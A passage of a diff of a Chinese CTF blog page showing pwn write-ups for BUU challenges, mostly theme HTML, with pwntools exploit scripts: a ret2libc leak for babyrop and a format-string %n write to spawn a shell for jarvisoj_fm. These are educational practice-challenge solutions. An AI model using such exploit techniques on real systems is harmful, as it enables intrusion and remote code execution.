class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#bin_sh_addr = offest + libc.search(&#x27;bin/sh&#x27;).next()</span></span><br><span class="line">bin_sh_addr = offest + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Correct\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27244</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xff&#x27;</span>*<span class="number">7</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x08048825</span></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">write_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">offest = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = offest + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#bin_sh_addr = offest + libc.search(&#x27;bin/sh&#x27;).next()</span></span><br><span class="line">bin_sh_addr = offest + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Correct\n&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
 
 <h2 id="Buu-jarvisoj-fm-fm-n任意内存写入"><a href="#Buu-jarvisoj-fm-fm-n任意内存写入" class="headerlink" title="Buu - jarvisoj_fm[ fm %n任意内存写入]"></a>Buu - jarvisoj_fm[ fm %n任意内存写入]</h2><p>checksec一下 32位，用IDA打开</p>
-<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/4-7-00.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/4-7-00.png"></p>
 <p><strong>思路：</strong></p>
 <p>要想shell，肯定要满足x&#x3D;&#x3D;4；</p>
 <p>然后又看到有<code>printf(buf)</code> 格式化字符串漏洞标志</p>
 <p>&#x3D;&gt; 通过%n向x地址写入4</p>
 <p><strong>1.确定偏移量</strong></p>
 <p>这是32位程序，第一个参数可以写入AAAA &#x3D; ( 正好占满一个栈的小格子(4字节)的空间 )</p>
-<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/4-7-01.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/4-7-01.png"></p>
 <p>-&gt; %08，让长度为8，比较容易好看吧，这个无所谓</p>
 <p>-&gt; %x(打印十六进制数据) 或者 %p(打印栈上数据)均可</p>
 <p>&#x3D;&#x3D;&gt; 偏移量为11</p>
 <p><strong>2.通过<code>%(偏移量)$n</code>来写入值</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># if语句中可以调用system(&#x27;bin/sh&#x27;) =&gt; 满足if语句</span></span><br><span class="line"><span class="comment"># 让x=4</span></span><br><span class="line"><span class="comment"># x - addr：0804A02C</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25301</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./fm&#x27;)</span></span><br><span class="line">x_addr = <span class="number">0x0804A02C</span></span><br><span class="line">payload = p32(x_addr) + <span class="string">&quot;%11$n&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># if语句中可以调用system(&#x27;bin/sh&#x27;) =&gt; 满足if语句</span></span><br><span class="line"><span class="comment"># 让x=4</span></span><br><span class="line"><span class="comment"># x - addr：0804A02C</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25301</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./fm&#x27;)</span></span><br><span class="line">x_addr = <span class="number">0x0804A02C</span></span><br><span class="line">payload = p32(x_addr) + <span class="string">&quot;%11$n&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
 
 
-    </div>
+        </div>
 
-    
-    
-    
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> BUU平台的Pwn题记录</li>
+        <li><strong>Author:</strong> The Redefine Team</li>
+        <li><strong>Created at
+                :</strong> 2024-03-26 01:59:06</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-04-08 00:38:26
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/CTF/Pwn/BUU刷题/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
 
-    <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/pwn/" rel="tag"># pwn</a>
-          </div>
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/pwn/">#pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
 
         
 
-          <div class="post-nav">
-            <div class="post-nav-item">
-                <a href="/CTF/Web/XSS%E6%BC%8F%E6%B4%9E/" rel="prev" title="XSS学习">
-                  <i class="fa fa-angle-left"></i> XSS学习
-                </a>
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/CTF/Misc/%E6%B5%81%E9%87%8F/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Misc-流量题记录</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/CTF/Web/XSS%E6%BC%8F%E6%B4%9E/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">XSS学习</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
             </div>
-            <div class="post-nav-item">
-                <a href="/CTF/Misc/%E6%B5%81%E9%87%8F/" rel="next" title="Misc-流量题记录">
-                  Misc-流量题记录 <i class="fa fa-angle-right"></i>
-                </a>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          recaptchaV3Key: "wasd",
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
             </div>
-          </div>
-    </footer>
-  </article>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">BUU平台的Pwn题记录</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-n-1"><span class="nav-number">1.</span> <span class="nav-text">ciscn_2019_n_1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9-%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA-2018-rop"><span class="nav-number">2.</span> <span class="nav-text">铁人三项(第五赛区)_2018_rop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-n-8"><span class="nav-number">3.</span> <span class="nav-text">ciscn_2019_n_8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jarvisoj-level2-x64"><span class="nav-number">4.</span> <span class="nav-text">jarvisoj_level2_x64</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%A6%E4%B9%A0%EF%BC%9A32%E4%BD%8D%E5%92%8C64%E4%BD%8D%E4%BC%A0%E5%8F%82%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">4.1.</span> <span class="nav-text">学习：32位和64位传参的区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%9A"><span class="nav-number">4.2.</span> <span class="nav-text">题解：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#not-the-same-3dsctf-2016-%E9%9D%99%E6%80%81-32%E4%BD%8D"><span class="nav-number">5.</span> <span class="nav-text">not_the_same_3dsctf_2016[静态 32位]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9B-PWN5"><span class="nav-number">6.</span> <span class="nav-text">[第五空间2019 决赛]PWN5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HDCTF-2023-KEEP-ON"><span class="nav-number">7.</span> <span class="nav-text">[HDCTF 2023]KEEP ON</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8A%AB%E6%8C%81%E3%80%81%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="nav-number">7.1.</span> <span class="nav-text">知识点：格式化字符串劫持、栈迁移 </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%951-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8A%AB%E6%8C%81-%E5%B0%86printf-got-%E6%94%B9%E6%88%90-system-plt"><span class="nav-number">7.2.</span> <span class="nav-text">法1,格式化字符串劫持(将printf_got 改成 system_plt)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%952-%E6%A0%88%E8%BF%81%E7%A7%BB-%E5%8F%AF%E4%BB%A5%E5%85%88%E9%98%85%E8%AF%BB%E5%89%8D%E9%9D%A2%E7%9A%84%E9%82%A3%E4%B8%AA%E6%96%87%E7%AB%A0"><span class="nav-number">7.3.</span> <span class="nav-text">法2,栈迁移,可以先阅读前面的那个文章</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BUU-HNCTF-2022-Week1-fmtstrre"><span class="nav-number">8.</span> <span class="nav-text">BUU-[HNCTF 2022 Week1]fmtstrre</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">8.1.</span> <span class="nav-text">exp:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OGeek2019-babyrop"><span class="nav-number">9.</span> <span class="nav-text">[OGeek2019]babyrop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Buu-jarvisoj-fm-fm-n%E4%BB%BB%E6%84%8F%E5%86%85%E5%AD%98%E5%86%99%E5%85%A5"><span class="nav-number">10.</span> <span class="nav-text">Buu - jarvisoj_fm[ fm %n任意内存写入]</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
 </div>
 
 
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">The Redefine Team</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        11 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.4</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js" type="module"></script>
 
 
 
 
     
-  <div class="comments" id="disqus_thread">
-    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
-  </div>
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
   
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
 </div>
-  </main>
 
-  <footer class="footer">
-    <div class="footer-inner">
-
-  <div class="copyright">
-    &copy; 
-    <span itemprop="copyrightYear">2024</span>
-    <span class="with-love">
-      <i class="fa fa-heart"></i>
-    </span>
-    <span class="author" itemprop="copyrightHolder">Li1x</span>
-  </div>
-<div class="wordcount">
-  <span class="post-meta-item">
-    <span class="post-meta-item-icon">
-      <i class="fa fa-chart-line"></i>
-    </span>
-    <span title="Word count total">70k</span>
-  </span>
-  <span class="post-meta-item">
-    <span class="post-meta-item-icon">
-      <i class="fa fa-coffee"></i>
-    </span>
-    <span title="Reading time total">2:08</span>
-  </span>
-</div>
-<div class="busuanzi-count">
-    <span class="post-meta-item" id="busuanzi_container_site_uv">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-user"></i>
-      </span>
-      <span class="site-uv" title="Total Visitors">
-        <span id="busuanzi_value_site_uv"></span>
-      </span>
-    </span>
-    <span class="post-meta-item" id="busuanzi_container_site_pv">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-eye"></i>
-      </span>
-      <span class="site-pv" title="Total Views">
-        <span id="busuanzi_value_site_pv"></span>
-      </span>
-    </span>
-</div>
-  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
-  </div>
-
-    </div>
-  </footer>
-
-  
-  <div class="back-to-top" role="button" aria-label="Back to top">
-    <i class="fa fa-arrow-up fa-lg"></i>
-    <span>0%</span>
-  </div>
-
-<noscript>
-  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
-</noscript>
-
-
-  
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
-<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
-<script src="/js/third-party/search/local-search.js"></script>
-
-
-
-
-
-
-
-  
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-
-
-
-<script class="next-config" data-name="disqus" type="application/json">{"enable":true,"shortname":"li1x","count":true,"i18n":{"disqus":"disqus"}}</script>
-<script src="/js/third-party/comments/disqus.js"></script>
 
 </body>
 </html>
